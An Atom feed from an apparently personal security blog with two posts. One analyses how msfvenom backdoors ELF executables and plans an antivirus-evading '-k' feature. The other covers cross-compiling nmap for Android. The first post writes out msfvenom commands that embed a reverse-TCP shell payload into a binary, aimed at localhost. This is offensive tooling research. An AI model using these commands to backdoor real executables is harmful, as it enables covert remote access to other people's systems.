<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: projects | Sheep Shellcode]]></title>
  <link href="http://quantumvm.github.io//github/blog/categories/projects/atom.xml" rel="self"/>
  <link href="http://quantumvm.github.io//github/"/>
  <updated>2016-04-12T22:21:20-04:00</updated>
  <id>http://quantumvm.github.io//github/</id>
  <author>
    <name><![CDATA[Vincent Moscatello]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Improving Msfvenom Part--1]]></title>
    <link href="http://quantumvm.github.io//github/blog/2014/10/28/improving-msfvenom-project/"/>
    <updated>2014-10-28T01:55:16-04:00</updated>
    <id>http://quantumvm.github.io//github/blog/2014/10/28/improving-msfvenom-project</id>
    <content type="html"><![CDATA[<p>This is  a progress/update on one of my current projects: improving the metasploit framework. In this part I am only doing reverse engineering/analysis of how msfvenom currently backdoors ELF files. This is all in an effort to add the “-k” functionality to ELF executables, the windows equivalent of an exe.</p>

<p>The -k flag is used by msfvenom to start a new thread for a payload that has been backdoored in an executable. This allows an attacker to preserve the original functionality of an executable while still executing the generated shellcode. This can come in quite handing for evading anti-virus. Unfortunately this feature is only available on 32-bit windows executables and msfvenom won&rsquo;t throw an error when you use this flag on a wrong file format.</p>

<p>Currently when you run the following two commands they will produce an identical executable that does not have the functionality of the &ldquo;-k&rdquo; flag.</p>

<pre><code class="bash">
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f elf -x a.out &gt; backdooredNoK

msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f elf -k -x a.out &gt; backdoored
</code></pre>

<p>This can be verified by performing an md5 hash of the two executables.</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/md5.png"></p>

<p>To figure out what MsfVenom is actually doing, the executable can be loaded into IDA disassembler for static analysis. Before the program is backdoored, the program entry point (_start) looks like this:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/normalstart.png"></p>

<p>After being backdoored the program entry point (_start) looks like this:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/backdooredstart.png"></p>

<p>The original program entry point is simply overwritten with the shellcode. This can be verified by comparing the hex view in IDA of the (_start) function to the RAW output of shellcode that can be generated by MsfVenom.</p>

<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f raw  &gt; RAW
</code></pre>

<p>The hex dump from IDA looks like:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/Idahexdump.png"></p>

<p>This is identical to the RAW shell code:</p>

<p><img class="center" src="/images/msfvenom-part-1-resources/rawshellcode.png"></p>

<p>In order to make this projectmore manageable I&rsquo;ve broken it up into five chuncks each of which acts as its own milestone for tackling the problem.</p>

<ol>
<li>Reverse engineer Windows/Linux executables to determine how msfvenom is currently handling the &ldquo;-k&rdquo; option. (where is machine code stored, how is it triggered, is it loading libraries, etc)</li>
<li>Using the gathered information, manually construct shellcode that will start in new thread for linux executable.</li>
<li>Write script that automates the threading process of previous milestone</li>
<li>Write script that embeds the new shellcode that starts in a thread into the elf executable.</li>
<li>Interface this script with msfvenom&rsquo;s &ldquo;-k&rdquo; option</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nmap on Android]]></title>
    <link href="http://quantumvm.github.io//github/blog/2014/10/11/nmap-on-android/"/>
    <updated>2014-10-11T20:00:56-04:00</updated>
    <id>http://quantumvm.github.io//github/blog/2014/10/11/nmap-on-android</id>
    <content type="html"><![CDATA[<p>This weekend, I got my first smart phone an Android LGLS740. What I love about android is that it is a Linux based operating system at its core. The very first application I went to download on it was Terminal Emulator for Android (<a href="https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;hl=en">https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;hl=en</a>). This effectively makes the phone a low spec computer you can carry in your pocket.</p>

<p>Although most of applications for android are written in java, It seemed logical that an ELF file should still be able to run so long as I compiled it for the right processor. I explored android&rsquo;s settings for cpu info but eventually gave up. I was a bit surprised I wasn&rsquo;t able to find this information under the &ldquo;Hardware information&rdquo; setting. I figured it would be much faster to just cat the cpuinfo file in the file system using the terminal app.</p>

<pre><code class="bash">
cat /proc/cpuinfo
</code></pre>

<p>Looks like its running ARMv7 rev 3.</p>

<p><img class="center" src="/images/android/android-cpuinfo.png" width="719" height="404"></p>

<p>Now that I knew which architecture I needed, I actually had to compile the software. This is where I started to encounter a few issues. Turns out cross compiling is signifigantly more invloved than I anticipated. I was very tempted to simply download and run the binaries found here: <a href="http://ftp.linux.hr/android/nmap/nmap-6.46-android-arm-bin.tar.bz2">http://ftp.linux.hr/android/nmap/nmap-6.46-android-arm-bin.tar.bz2</a></p>

<p>Yet&hellip; this was a community donated program that isn&rsquo;t located in official repositories. The author didn&rsquo;t even provide an md5 hash. This was also for nmap 6.46 instead of 6.47. Furthermore given the &ldquo;.hr&rdquo; domain the binary appeared to be hosted somewhere in croatia? This risk of the program being back doored seemed to be a little out of my comfort zone so I went off and downloaded the nmap sourcecode.</p>

<p>To solve the cross compiling issue I ended up using the android NDK found here: <a href="https://developer.android.com/tools/sdk/ndk/index.html">https://developer.android.com/tools/sdk/ndk/index.html</a></p>

<p>I did a bit more exploring to see if somone had used the NDK to compile nmap before. Turns out they had. <a href="https://github.com/kost/nmap-android/Makefile">https://github.com/kost/nmap-android/Makefile</a> After I read through the Makefile so I had a full understanding of what it was doing, I noticed that there were several issues with it and this was confirmed by other comments on the issues tab. These were issues from 2 years ago which unfortunately were unresolved. Rather than rewriting the make file from scratch I decided to modify the existing make file so it actually worked. You can find it here: <a href="https://github.com/quantumvm/AndroidNmap/blob/master/android/Makefile">https://github.com/quantumvm/AndroidNmap/blob/master/android/Makefile</a></p>

<p>After running the make file as &ldquo;make doit&rdquo; I encountered another issue but this time with the actual NDK itself. Turns out there was an issue caused by bash that was making the script make-standalone-toolchain.sh fail. I located the syntax error at line 723 and changed:</p>

<p><strong>OLD</strong>
<code>bash
for ABI in $(tr ',' ' ' &lt;&lt;&lt; $ABIS); do
</code>
<strong>NEW</strong>
<code>bash
for ABI in $(echo "$ABIS" | tr ',' ' '); do
</code></p>

<p>I then once again ran the make file but this time with the havendk argument:
make havendk</p>

<p>SUCCESS the screen filled with a bunch of ascii art that appears when you compile nmap manually. :&lsquo;)</p>

<p><img class="center" src="/images/android/android-nmap.png" width="719" height="404"></p>

<p>I didn&rsquo;t feel like rooting my phone to get the binary to run. Instead I just copied the binary from my sd card&rsquo;s Download folder into the Terminal apps home directory located at /data/data/jackpal.androidterm Before the binary could actaully be run it was necissary to run chmod on it. Nmap does have a few dependencies which need to be copied onto the sdcard. Based on our makefile they must be located in /sdcard/opt/nmap-6.47 most notable is the nmap-services file. This has to be located at /sdcard/opt/nmap-6.47/share/nmap</p>
]]></content>
  </entry>
  
</feed>
